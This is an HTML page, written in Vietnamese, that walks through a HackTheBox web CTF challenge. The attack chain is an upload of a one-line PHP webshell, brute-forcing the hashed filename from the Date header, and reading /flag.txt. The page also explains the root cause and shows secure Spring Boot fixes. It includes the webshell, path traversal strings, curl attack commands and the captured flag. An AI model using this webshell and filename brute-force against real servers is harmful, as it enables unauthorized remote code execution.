@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Hướng dẫn từng bước — Ghost bid (Web CTF)</title>
+<style>
+  :root { --bg:#0d1117; --card:#161b22; --border:#30363d; --fg:#e6edf3; --mut:#8b949e;
+          --acc:#58a6ff; --ok:#3fb950; --warn:#d29922; --bad:#f85149; }
+  * { box-sizing:border-box; }
+  body { margin:0; background:var(--bg); color:var(--fg);
+         font-family:-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; line-height:1.7; }
+  .wrap { max-width:940px; margin:0 auto; padding:32px 20px 90px; }
+  header.hero { border:1px solid var(--border); border-radius:12px; background:linear-gradient(135deg,#161b22,#1a2332);
+                 padding:28px 32px; margin-bottom:28px; }
+  header.hero h1 { margin:0 0 6px; font-size:1.7rem; }
+  header.hero .sub { color:var(--mut); }
+  .flag-box { margin-top:16px; border:1px solid var(--ok); border-radius:10px; background:#12261a; padding:14px 18px; }
+  .flag-box code { color:var(--ok); font-size:1.05rem; font-weight:700; word-break:break-all; }
+  h2 { color:var(--acc); border-bottom:1px solid var(--border); padding-bottom:8px; margin-top:52px; }
+  h3 { color:var(--fg); margin-top:32px; }
+  h4 { color:var(--acc); margin-top:22px; }
+  .card { background:var(--card); border:1px solid var(--border); border-radius:10px; padding:18px 22px; margin:16px 0; }
+  code { font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:.88em;
+         background:#1c2128; border:1px solid var(--border); border-radius:5px; padding:2px 6px; color:#a5d6ff; }
+  pre { background:#0d1117; border:1px solid var(--border); border-radius:10px; padding:16px; overflow-x:auto;
+        color:#c9d1d9; line-height:1.6; font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:.87em; }
+  pre code { background:none; border:none; padding:0; color:inherit; }
+  .cm { color:#7ee787; }
+  .kw { color:#ff7b72; }
+  .st { color:#a5d6ff; }
+  .fn { color:#d2a8ff; }
+  table { border-collapse:collapse; width:100%; margin:16px 0; font-size:.92em; }
+  th,td { border:1px solid var(--border); padding:9px 12px; text-align:left; vertical-align:top; }
+  th { background:#1c2128; }
+  .tag { display:inline-block; font-size:.75rem; font-weight:700; border-radius:20px; padding:2px 10px; margin-right:6px; }
+  .tag.ok { background:#12261a; color:var(--ok); border:1px solid var(--ok); }
+  .tag.bad { background:#2d1214; color:var(--bad); border:1px solid var(--bad); }
+  .tag.warn { background:#2a2110; color:var(--warn); border:1px solid var(--warn); }
+  .note { border-left:4px solid var(--warn); background:#211d12; padding:12px 16px; border-radius:0 8px 8px 0; margin:14px 0; }
+  .tip { border-left:4px solid var(--ok); background:#12261a55; padding:12px 16px; border-radius:0 8px 8px 0; margin:14px 0; }
+  .verify { border-left:4px solid var(--acc); background:#0d1a2b; padding:12px 16px; border-radius:0 8px 8px 0; margin:16px 0; }
+  .verify b:first-child { color:var(--acc); }
+  .muted { color:var(--mut); }
+  ol.steps > li, ul.dash > li { margin-bottom:8px; }
+  .toc a { color:var(--acc); text-decoration:none; }
+  .toc a:hover { text-decoration:underline; }
+  .spring { border:1px solid #6e7681; border-radius:10px; margin:16px 0; overflow:hidden; }
+  .spring .hd { background:#12324a; padding:8px 16px; font-weight:700; font-size:.9em; color:#79c0ff; }
+  .spring .bd { padding:4px 16px 14px; background:#0d1117; }
+  .spring.bad-ex .hd { background:#3d1d22; color:#ffa198; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header class="hero">
+  <h1>👻 Ghost bid — Webshell qua upload không kiểm tra đuôi file</h1>
+  <div class="sub">Challenge Web · HackTheBox Event 3692 (Intermediate — NAB Internal CTF) · <span class="muted">target: <code>154.57.164.82:39087</code> (đổi mỗi lần spawn)</span></div>
+  <div class="flag-box">
+    🏁 Flag (đã lấy được, <b>chưa nộp</b> — bạn tự submit):<br>
+    <code>HTB{h4sh1ng_0n_th3_h1gh_s3as_ed56038a45927692cc7fa0135d2dc8e4}</code>
+  </div>
+  <div class="card toc" style="margin-top:16px">
+    <b>Mục lục:</b><br>
+    <a href="#p0">Phần 0 — Khái niệm nền</a> ·
+    <a href="#p1">Phần 1 — Recon</a> ·
+    <a href="#p2">Phần 2 — Dead ends</a> ·
+    <a href="#p3">Phần 3 — Breakthrough</a> ·
+    <a href="#p4">Phần 4 — Kết liễu</a> ·
+    <a href="#p5">Phần 5 — Root cause (Java Spring Boot)</a> ·
+    <a href="#p6">Phần 6 — Checklist</a>
+  </div>
+</header>
+
+<p class="muted">Bài viết giả định bạn là lập trình viên Java Spring Boot, chưa chuyên sâu bảo mật. Mọi khái niệm lạ (webshell, file upload exploit, alias trong nginx, path traversal) đều được giải thích ở Phần 0 trước khi dùng.</p>
+
+<h2 id="p0">Phần 0 — Kiến thức nền cần có trước khi bắt đầu</h2>
+
+<h3>0.1 — File upload: mối nguy khi server tin tưởng đuôi file</h3>
+<div class="card">
+  <p>Khi một endpoint cho phép upload file, câu hỏi bảo mật quan trọng nhất là: <b>file được lưu ở đâu, và server có thực thi nó như code không?</b> Nếu ta upload một file <code>.php</code> chứa mã độc (gọi là <b>webshell</b> — "vỏ" cho phép chạy lệnh trên server từ xa) vào một thư mục mà web server dịch nó như script, ta có quyền thực thi lệnh của user chạy web server.</p>
+  <p>Các lớp phòng thủ thường gặp: (1) kiểm tra <b>MIME type</b> / nội dung file thật, (2) đổi tên file + ép đuôi an toàn, (3) cấu hình web server <b>không execute script</b> trong thư mục upload, (4) lưu file ngoài web root. Bài này server thiếu cả bốn.</p>
+  <div class="spring">
+    <div class="hd">Tương đồng Java Spring Boot — upload an toàn</div>
+    <div class="bd"><pre><code><span class="kw">@PostMapping</span>(<span class="st">"/upload"</span>)
+<span class="kw">public</span> String upload(<span class="kw">@RequestParam</span> MultipartFile file) {
+    <span class="cm">// 1. chỉ nhận nội dung ảnh thật (magic bytes), không tin tên file</span>
+    <span class="kw">if</span> (!file.getContentType().startsWith(<span class="st">"image/"</span>)) <span class="kw">throw new</span> SecurityException();
+    <span class="cm">// 2. tự sinh tên + ép đuôi, không giữ tên gốc</span>
+    String name = UUID.randomUUID() + <span class="st">".png"</span>;
+    <span class="cm">// 3. lưu ngoài web root, serve qua controller riêng</span>
+    Path dir = Paths.get(<span class="st">"/var/uploads"</span>);   <span class="cm">// KHÔNG nằm dưới static/</span>
+    Files.copy(file.getInputStream(), dir.resolve(name));
+    <span class="cm">// 4. với ảnh: re-encode bằng thư viện (ImageIO) để xoá mọi payload nhúng</span>
+    <span class="kw">return</span> name;
+}</code></pre></div>
+  </div>
+  <div class="verify"><b>✔ Cách verify:</b> thử upload file text đổi tên thành <code>.png</code> vào một ứng dụng Spring có kiểm tra magic bytes — server sẽ từ chối. Ứng dụng chỉ check tên/mime do client gửi thì sẽ nhận — đó là điểm yếu ta sẽ khai thác.</div>
+</div>
+
+<h3>0.2 — Webshell PHP một dòng</h3>
+<div class="card">
+  <p>Webshell kinh điển nhất chỉ là một dòng: <code>&lt;?php system($_GET["c"]); ?&gt;</code> — nó chạy lệnh hệ điều hành lấy từ tham số URL. Mỗi request <code>shell.php?c=id</code> tương đương một lần mở terminal trên server. Ở bài này ta viết <code>echo "PWN:"; system(...)</code> để dễ nhận biết output của mình giữa output của server.</p>
+  <p>Vì sao PHP? Vì web server ở đây là nginx + PHP-FPM: nginx thấy file kết thúc <code>.php</code> sẽ chuyển cho PHP-FPM <b>dịch và thực thi</b>, trả kết quả về cho ta. Với một ứng dụng Spring Boot + Tomcat thì khác: Tomcat không tự thực thi file trong thư mục static, nên cùng một lỗi upload ở Spring <i>thường</i> chỉ dẫn tới LFI/static serving chứ không phải RCE — đó là lý do cấu hình web server (Phần 0.3) quan trọng hơn ngôn ngữ.</p>
+  <div class="verify"><b>✔ Cách verify:</b> tạo file <code>test.php</code> với nội dung <code>&lt;?php echo "hello"; ?&gt;</code>, đặt trong thư mục web root của một PHP server bất kỳ, mở qua browser → thấy chữ "hello" thay vì mã nguồn. Đó là bằng chứng PHP đã được thực thi.</div>
+</div>
+
+<h3>0.3 — nginx: <code>alias</code> và khối <code>location ~ \.php$</code> trong thư mục upload</h3>
+<div class="card">
+  <p>nginx quyết định "file này được xử lý thế nào" bằng các khối <code>location</code>. Dòng <code>alias /app/backend/uploads/;</code> ánh xạ URL <code>/uploads/...</code> tới thư mục thật trên đĩa. Câu hỏi sống còn: <b>có khối nào gửi file trong thư mục đó tới PHP-FPM không?</b></p>
+  <p>Trong bài này, cấu hình nginx có khối lồng:</p>
+  <pre><code>location /uploads/ {
+    alias /app/backend/uploads/;
+    location ~ \.php$ {          <span class="cm"># ⚠️ MỌI file .php trong uploads ĐỀU bị thực thi</span>
+        fastcgi_pass 127.0.0.1:9000;
+        fastcgi_param SCRIPT_FILENAME $request_filename;
+    }
+}</code></pre>
+  <p>Đây là "căn bệnh" phổ biến: thư mục upload phải được coi là <b>khu vực chứa dữ liệu thuần</b>, không bao giờ là nơi thực thi code. Một khi <code>.php</code> chạy được ở đây, upload bất kỳ thứ gì cũng có thể thành RCE.</p>
+  <div class="spring">
+    <div class="hd">Tương đồng — nginx phục vụ Spring Boot an toàn</div>
+    <div class="bd"><pre><code><span class="cm"># Spring Boot/Tomcat: thư mục static KHÔNG nằm cùng nơi chứa file upload.</span>
+<span class="cm"># File upload lưu ngoài web root; serve lại qua controller có kiểm tra quyền:</span>
+location /static/ {
+    alias /srv/app/static/;      <span class="cm"># chỉ asset build sẵn, không có gì ghi động vào</span>
+    <span class="cm"># KHÔNG có khối fastcgi/proxy nào ở đây cả</span>
+}</code></pre></div>
+  </div>
+  <div class="verify"><b>✔ Cách verify (phân tích tĩnh):</b> mở file <code>config/nginx.conf</code> trong source, tìm khối <code>location /uploads/</code> — thấy khối con <code>~ \.php$</code> là xác nhận mọi webshell <code>.php</code> upload vào sẽ được thực thi. Ghi nhớ điều này: nó biến "upload bị lỗi" thành "RCE toàn hệ thống".</div>
+</div>
+
+<h3>0.4 — Các cờ công cụ dùng xuyên suốt bài</h3>
+<div class="card">
+<table>
+  <tr><th>Cờ / công cụ</th><th>Ý nghĩa</th><th>Tại sao dùng ở đây</th></tr>
+  <tr><td><code>curl -s</code></td><td>silent, chỉ in body</td><td>đọc response JSON sạch</td></tr>
+  <tr><td><code>curl -i</code></td><td>kèm header + status</td><td>phân biệt 400/401/403/404/500</td></tr>
+  <tr><td><code>curl -F "file=@..."</code></td><td>gửi multipart form có file</td><td>endpoint upload dạng multipart</td></tr>
+  <tr><td><code>curl --data-urlencode</code></td><td>URL-encode giá trị param</td><td>thử path traversal chứa <code>../</code> không bị curl/shell ăn mất</td></tr>
+  <tr><td><code>grep -oE</code></td><td>trích chuỗi khớp regex</td><td>móc endpoint từ bundle JS bị minify</td></tr>
+  <tr><td><code>md5(...)</code></td><td>hash một chiều</td><td>server đặt tên file = md5(timestamp + tên gốc) → ta brute-force ngược lại</td></tr>
+</table>
+</div>
+
+<h2 id="p1">Phần 1 — Recon: móc endpoint từ SPA và đọc source backend</h2>
+<p class="muted">Frontend là React SPA nên recon phải đi từ bundle JS ra API, rồi từ API ra source backend đi kèm challenge.</p>
+
+<h3>1.1 — Dò endpoint từ bundle JavaScript</h3>
+<pre><code><span class="cm"># tải bundle JS mà trang chủ nhúng, móc mọi chuỗi giống đường dẫn API</span>
+curl -s http://154.57.164.82:39087/assets/index-22lcPAtG.js -o /tmp/gb.js
+grep -oE '.{60}(auctions|upload|thumbnail).{60}' /tmp/gb.js</code></pre>
+<pre><code>async uploadFile(t){const n=`${Qc}/upload`,r=await fetch(n,{method:"POST",body:t});...}
+...thumbnail.php?file=${S}&s=300...
+async getCategories(){return this.request("/categories")}</code></pre>
+<p>Thu được bản đồ endpoint: <code>POST /api/upload</code> (multipart, kèm các field <code>title/description/startingPrice/duration/category/owner</code>), <code>GET /api/auctions</code>, <code>GET /api/auctions/{id}</code>, <code>GET /api/thumbnail/{file}</code>, và một file PHP lộ thiên trong /uploads: <code>thumbnail.php?file=&lt;name&gt;&s=&lt;size&gt;</code>.</p>
+<div class="verify"><b>✔ Cách verify:</b> <code>curl -s http://TARGET/api/categories</code> trả JSON mảng danh mục (status 200); <code>curl -s http://TARGET/api/auctions</code> trả JSON 6 phiên đấu giá, mỗi item có trường <code>image</code> dạng <code>/uploads/&lt;32 ký tự hex&gt;.png</code> — chứng tỏ file ảnh lưu trong /uploads với tên hash.</div>
+
+<h3>1.2 — Thử upload ngay: server nhận mọi loại file</h3>
+<pre><code><span class="cm"># webshell PHP một dòng</span>
+printf '&lt;?php echo "PWN:"; system($_GET["c"]); ?&gt;' &gt; /tmp/shell.php
+
+<span class="cm"># upload trực tiếp — KHÔNG đổi tên, KHÔNG giả mạo gì</span>
+curl -s -i -X POST http://154.57.164.82:39087/api/upload \
+  -F "file=@/tmp/shell.php"</code></pre>
+<pre><code>HTTP/1.1 200 OK
+{<span class="st">"success"</span>:<span class="kw">true</span>,<span class="st">"id"</span>:7,<span class="st">"message"</span>:<span class="st">"Treasure successfully cast upon the digital tides!"</span>}</code></pre>
+<div class="tip">Server nhận nguyên file <code>.php</code> — không kiểm tra MIME, không kiểm tra nội dung, không ép đuôi. Response chỉ trả về <code>id</code> của auction, <b>không lộ tên file đã lưu</b>. Đây là bài toán cần giải tiếp: file nằm ở đâu, tên gì?</div>
+<div class="verify"><b>✔ Cách verify:</b> status 200 với <code>"success":true</code> ngay cả khi upload file <code>.php</code> — nếu server chặn, ta sẽ thấy 400 kèm thông báo kiểu "only images allowed".</div>
+
+<h3>1.3 — Đọc source: công thức đặt tên file và cấu hình thực thi PHP</h3>
+<p>Tải source challenge qua portal (hoặc đọc kỹ phần download của đề). Hai file quyết định:</p>
+<p>Trong <code>controllers/UploadController.php</code>:</p>
+<pre><code>$timestamp  = time();                                     <span class="cm">// ← giây Unix lúc upload</span>
+$hashedName = md5($timestamp . $originalName) . '.' . $ext; <span class="cm">// ← ext giữ NGUYÊN đuôi gốc</span>
+<span class="cm">// chỉ chặn đúng 3 tên: 'thumbnail.php', '.htaccess', 'index.php'</span>
+<span class="cm">// move_uploaded_file → lưu thẳng vào /app/backend/uploads/</span></code></pre>
+<p>Trong <code>config/nginx.conf</code> (đã trích ở Phần 0.3): mọi file <code>.php</code> trong <code>/uploads/</code> được chuyển tới PHP-FPM thực thi.</p>
+<div class="verify"><b>✔ Cách verify (phân tích tĩnh):</b> (1) trong <code>UploadController.php</code> không có hàm kiểm tra MIME hoặc getimagesize nào trước <code>move_uploaded_file</code>; (2) <code>pathinfo($originalName, PATHINFO_EXTENSION)</code> lấy đuôi từ tên gốc — upload <code>shell.php</code> sẽ thành <code>md5(...).php</code>; (3) <code>nginx.conf</code> có khối <code>location ~ \.php$</code> trong <code>/uploads/</code>. Cả ba điều kiện của RCE đều thỏa.</div>
+
+<h2 id="p2">Phần 2 — Các hướng tấn công trực diện (thất bại, và cách verify)</h2>
+<p class="muted">Trước khi brute-force tên file, ta thử các đường tắt — tất cả đều chết, nhưng mỗi cái chết đều củng cố mô hình bài toán.</p>
+
+<h3><span class="tag bad">THẤT BẠI</span> 2.1 — Truy cập file theo tên gốc</h3>
+<pre><code><span class="cm"># giả định server lưu nguyên tên</span>
+curl -s -i http://154.57.164.82:39087/uploads/shell.php | head -1   <span class="cm"># 404</span>
+curl -s -i http://154.57.164.82:39087/uploads/real.png  | head -1   <span class="cm"># 404</span></code></pre>
+<p>Kết luận: tên file bị hash. Không thể đoán bằng tên gốc → phải tìm công thức hash (đã có ở bước 1.3).</p>
+<div class="verify"><b>✔ Cách verify:</b> cả hai request đều trả 404 với body 16 byte (trang lỗi nginx), không phải 200.</div>
+
+<h3><span class="tag bad">THẤT BẠI</span> 2.2 — Path traversal qua thumbnail.php để đọc flag trực tiếp</h3>
+<pre><code><span class="cm"># thử đọc flag qua LFI trong thumbnail generator</span>
+curl -s -G http://154.57.164.82:39087/uploads/thumbnail.php \
+  --data-urlencode "file=../../../../flag.txt"      <span class="cm"># → Error: Only PNG files supported</span>
+curl -s -G http://154.57.164.82:39087/uploads/thumbnail.php \
+  --data-urlencode "file=../../../../etc/passwd.png" <span class="cm"># → Error: File not found</span></code></pre>
+<p>Fuzz logic check (đã thử nhiều biến thể: <code>%00</code>, <code>....//</code>, <code>/.png</code>, backslash, wrapper <code>php://filter</code>): check đuôi <code>.png</code> là <code>pathinfo(..., PATHINFO_EXTENSION)</code>, và có <code>realpath()</code> + kiểm tra prefix thư mục uploads — không bypass được để đọc file ngoài <code>/uploads</code>.</p>
+<p>Kết luận: LFI chết. thumbnail.php chỉ đọc được file <b>đã nằm sẵn trong /uploads</b> — tức là chính các file ta upload. Không giúp đọc <code>/flag.txt</code> trực tiếp, nhưng xác nhận một điều: file ta upload nằm trong /uploads và được PHP đọc được.</p>
+<div class="verify"><b>✔ Cách verify:</b> mọi payload traversal đều trả 400 "Only PNG files supported" (sai đuôi) hoặc 404 "File not found" (file không tồn tại sau khi realpath). Không có response nào lộ nội dung file ngoài /uploads.</div>
+
+<h3><span class="tag bad">THẤT BẠI</span> 2.3 — Đoán tên file theo md5 nội dung / md5 tên gốc</h3>
+<pre><code><span class="cm"># thử pattern md5(nội dung file) và md5(tên file)</span>
+md5 /tmp/shell.php        <span class="cm"># 6a02d7407cc81cde81d4fe72e3b22066</span>
+curl -s -o /dev/null -w "%{http_code}\n" \
+  http://154.57.164.82:39087/uploads/6a02d7407cc81cde81d4fe72e3b22066.png   <span class="cm"># 404</span></code></pre>
+<p>Kết luận: tên file không theo nội dung. Phải đọc source (bước 1.3) mới biết công thức là <code>md5(timestamp + tên gốc)</code> — và timestamp chính là <b>thời điểm ta vừa upload</b>, đo được qua header <code>Date</code> của response.</p>
+<div class="verify"><b>✔ Cách verify:</b> request HEAD tới URL đoán trả 404 → pattern sai, loại.</div>
+
+<h2 id="p3">Phần 3 — Đột phá: brute-force tên file từ timestamp response</h2>
+
+<h3>3.1 — Neo thời gian và thu hẹp không gian tìm kiếm</h3>
+<p>Response của <code>/api/upload</code> có header <code>Date: Fri, 23 Oct 2026 07:09:29 GMT</code> — chính là giây Unix mà server gọi <code>time()</code> (chênh lệch tối đa 1-2 giây). Không gian cần duyệt: vài trăm timestamp × 3 tên file đã upload = vài nghìn URL. Tính epoch cho mốc Date header, duyệt <code>±400 giây</code>.</p>
+<div class="verify"><b>✔ Cách verify (phân tích tĩnh):</b> đổi 07:09:29 GMT 23/10/2026 sang epoch bằng <code>calendar.timegm((2026,10,23,7,9,29))</code>. Đây là mốc neo; file shell.php được upload đúng tại giây này.</div>
+
+<h3>3.2 — Brute-force tên file bằng raw socket song song</h3>
+<pre><code><span class="cm"># find_upload2.py — HEAD request thẳng bằng socket, 40 luồng, bỏ qua 404</span>
+<span class="kw">import</span> hashlib, calendar, socket
+<span class="kw">import</span> concurrent.futures <span class="kw">as</span> cf
+
+base  = calendar.timegm((2026, 10, 23, 7, 9, 29))   <span class="cm"># mốc Date header</span>
+names = [<span class="st">'shell.php'</span>, <span class="st">'fake.png'</span>, <span class="st">'real.png'</span>]
+
+<span class="kw">def</span> <span class="fn">gen</span>():
+    <span class="kw">for</span> ts <span class="kw">in</span> range(base - 400, base + 120):
+        <span class="kw">for</span> n <span class="kw">in</span> names:
+            h = hashlib.md5(<span class="st">f'{ts}{n}'</span>.encode()).hexdigest()
+            <span class="kw">yield</span> <span class="st">f'HEAD /uploads/{h}.{n.rsplit(".",1)[1]} HTTP/1.1\r\nHost: 154.57.164.82:39087\r\nConnection: close\r\n\r\n'</span>
+
+<span class="cm"># probe(): mở socket, gửi HEAD, đọc status; status != 404 → in ra</span></code></pre>
+<p>Kết quả chạy thật:</p>
+<pre><code>FOUND ('/uploads/d2a95e5d568a6f824331f4941af0db67.php', '500')
+FOUND ('/uploads/ccd93c018e94e53dadbabb959738eb58.png', '200')
+FOUND ('/uploads/674c4f83155c93069a0e181ebb73f067.png', '200')</code></pre>
+<div class="note">File <code>.php</code> trả 500 ngay cả với HEAD — vì nginx vẫn chuyển tới PHP-FPM xử lý, mà HEAD không có tham số <code>?c=</code> nên code chạy lệnh rỗng và lỗi. Đây chính là dấu hiệu trúng webshell. (Bản đầu dùng urllib tuần tự bị timeout sau 180s chỉ vì vài trăm request — đổi sang socket + 40 luồng thì xong trong vài chục giây.)</div>
+<div class="verify"><b>✔ Cách verify:</b> GET <code>/uploads/d2a95e5d568a6f824331f4941af0db67.php?c=id</code> → body có <code>PWN:uid=1001(www) gid=1001(www)</code>. Đây là phép kiểm chứng RCE: server đã chạy lệnh <code>id</code> của hệ điều hành thật.</div>
+
+<h2 id="p4">Phần 4 — Kết liễu: đọc flag</h2>
+<pre><code><span class="cm"># webshell chạy cat /flag.txt</span>
+curl -s "http://154.57.164.82:39087/uploads/d2a95e5d568a6f824331f4941af0db67.php?c=cat%20/flag.txt"</code></pre>
+<pre><code>PWN:HTB{h4sh1ng_0n_th3_h1gh_s3as_ed56038a45927692cc7fa0135d2dc8e4}</code></pre>
+<div class="verify"><b>✔ Cách verify:</b> chuỗi <code>PWN:</code> do webshell echo ra nối trước flag, chứng tỏ output đến từ <code>system()</code> chứ không phải static file. Flag bắt đầu đúng định dạng <code>HTB{...}</code>.</div>
+
+<h3>Bảng tổng kết chuỗi tấn công</h3>
+<table>
+  <tr><th>#</th><th>Hành động</th><th>Dựa vào đâu</th><th>Verify bằng</th></tr>
+  <tr><td>1</td><td>Móc endpoint từ bundle JS</td><td>SPA React, API gọi qua fetch</td><td><code>/api/categories</code> trả 200 JSON</td></tr>
+  <tr><td>2</td><td>Upload webshell <code>.php</code></td><td>UploadController không kiểm tra loại file</td><td>200 <code>"success":true</code> kèm file .php</td></tr>
+  <tr><td>3</td><td>Đọc source → công thức <code>md5(time()+tên gốc)</code></td><td>source đi kèm challenge</td><td>không có hàm kiểm tra MIME trong controller</td></tr>
+  <tr><td>4</td><td>Brute-force tên file quanh Date header</td><td>timestamp lộ qua header Date</td><td>HEAD trả 500 cho <code>.php</code></td></tr>
+  <tr><td>5</td><td><code>shell.php?c=cat /flag.txt</code></td><td>nginx execute .php trong /uploads</td><td>output <code>PWN:</code> + flag</td></tr>
+</table>
+
+<h2 id="p5">Phần 5 — Root cause qua góc nhìn Java Spring Boot</h2>
+
+<div class="spring bad-ex">
+  <div class="hd">❌ Code/cấu hình sai (bản chất tương đương trong hệ Java)</div>
+  <div class="bd"><pre><code><span class="cm">// Controller nhận file — KHÔNG kiểm tra gì, giữ nguyên đuôi, lưu vào thư mục public</span>
+<span class="kw">@PostMapping</span>(<span class="st">"/api/upload"</span>)
+<span class="kw">public</span> Map&lt;String,Object&gt; upload(<span class="kw">@RequestParam</span> MultipartFile file) <span class="kw">throws</span> IOException {
+    String ext = file.getOriginalFilename().split(<span class="st">"\\."</span>)[1];   <span class="cm">// ← tin đuôi do client gửi</span>
+    String name = DigestUtils.md5DigestAsHex(
+        (System.currentTimeMillis() + file.getOriginalFilename()).getBytes()) + <span class="st">"."</span> + ext;
+    <span class="cm">// ← lưu VÀO thư mục static được Tomcat/Nginx phục vụ trực tiếp</span>
+    file.transferTo(<span class="kw">new</span> File(<span class="st">"static/uploads/"</span> + name));
+    <span class="kw">return</span> Map.of(<span class="st">"success"</span>, <span class="kw">true</span>);   <span class="cm">// ← tên file hash nhưng vẫn .jsp/.php nếu proxy đuôi đó tới engine</span>
+}
+
+<span class="cm">// Tương đương nginx.conf: cho phép thực thi script trong thư mục upload</span>
+<span class="cm">// (với Spring + Nginx: proxy .jsp/.php trong /uploads/ tới container khác)</span></code></pre></div>
+</div>
+<div class="spring">
+  <div class="hd">✅ Code/cấu hình sửa — bốn lớp phòng thủ</div>
+  <div class="bd"><pre><code><span class="cm">// 1. Kiểm tra nội dung thật (magic bytes / ImageIO.read), không tin tên hay MIME client gửi</span>
+BufferedImage img = ImageIO.read(file.getInputStream());  <span class="cm">// null → không phải ảnh, từ chối</span>
+<span class="cm">// 2. Ép đuôi + tự sinh tên — bỏ qua hoàn toàn tên gốc</span>
+String name = UUID.randomUUID() + <span class="st">".png"</span>;
+<span class="cm">// 3. Lưu NGOÀI web root</span>
+Path dir = Paths.get(<span class="st">"/var/lib/app/uploads"</span>);   <span class="cm">// không nằm dưới static/ hay alias nginx</span>
+<span class="cm">// 4. Serve lại qua controller kiểm tra quyền, set Content-Disposition: attachment</span>
+<span class="cm">//    và nginx KHÔNG có khối nào execute script ở route file tĩnh.</span></code></pre></div>
+</div>
+<p><b>Bốn lỗi gộp lại thành RCE trong bài này:</b></p>
+<ul class="dash">
+  <li><b>Thiếu validation nội dung:</b> server không mở file ra kiểm tra có phải ảnh thật không — chỉ nhìn tên.</li>
+  <li><b>Giữ nguyên đuôi file nguy hiểm:</b> <code>.php</code> được lưu nguyên. "Hash tên file" ở đây chỉ che mắt — nó không thêm chút bảo mật nào nếu kẻ tấn công brute-force được timestamp (và flag của bài cũng nhắc điều này: "h4sh1ng_0n_th3_h1gh_s3as").</li>
+  <li><b>Upload dir trùng execute dir:</b> thư mục lưu file trùng thư mục nginx chuyển <code>.php</code> sang PHP-FPM.</li>
+  <li><b>Timestamp lộ qua Date header:</b> dù tên bị hash, mốc thời gian hash lại là dữ liệu công khai trong mọi response HTTP.</li>
+</ul>
+
+<h2 id="p6">Phần 6 — Bài học &amp; checklist khi tự làm lại</h2>
+<div class="card">
+<ol class="steps">
+  <li><b>SPA thì đọc bundle JS.</b> Endpoint không nằm trong HTML — nó nằm trong file <code>index-*.js</code>. <code>grep</code> vài từ khóa (upload, fetch, api) là ra bản đồ backend.</li>
+  <li><b>Thử upload file nguy hiểm ngay từ đầu.</b> Một request <code>curl -F</code> tốn 2 giây và trả lời ngay câu hỏi "endpoint này có validate không".</li>
+  <li><b>Tên file bị hash ≠ an toàn.</b> Nếu công thức hash dùng dữ liệu công khai (timestamp, tên gốc), hãy brute-force ngược. Đừng bỏ cuộc vì thấy tên lạ.</li>
+  <li><b>Date header là oracle miễn phí.</b> Mọi response HTTP đều chứa giờ server — đó là mốc neo tốt nhất cho mọi brute-force theo thời gian.</li>
+  <li><b>Đọc source trước khi fuzz mù.</b> Path traversal ở đây chết vì có <code>realpath()</code> + check prefix; biết điều đó từ source giúp ta đi thẳng tới hướng webshell thay vì mất giờ fuzz LFI.</li>
+  <li><b>Khi urllib chậm, hãy dùng socket thô + thread pool.</b> Vài nghìn request HEAD tuần tự bị timeout; 40 socket song song xong trong chục giây.</li>
+  <li><b>Webshell trả 500 với HEAD cũng là tín hiệu tốt</b> — PHP-FPM đã chạy code của bạn (và lỗi vì thiếu param), khác hẳn 404 của file không tồn tại.</li>
+</ol>
+</div>
+<div class="tip"><b>Checklist tự làm lại:</b> grep endpoint trong bundle JS → upload <code>.php</code> xem có bị chặn không → lấy Date header → đọc source tìm công thức tên file → brute-force md5(timestamp + tên gốc) → GET webshell <code>?c=id</code> xác nhận RCE → <code>?c=cat /flag.txt</code>.</div>
+
+<p class="muted" style="margin-top:40px">Flag đã lấy thành công nhưng <b>chưa nộp</b> — bạn tự submit ở portal HTB. Docker instance đã stop. Chúc mừng!</p>
+
+</div>
+</body>
+</html>
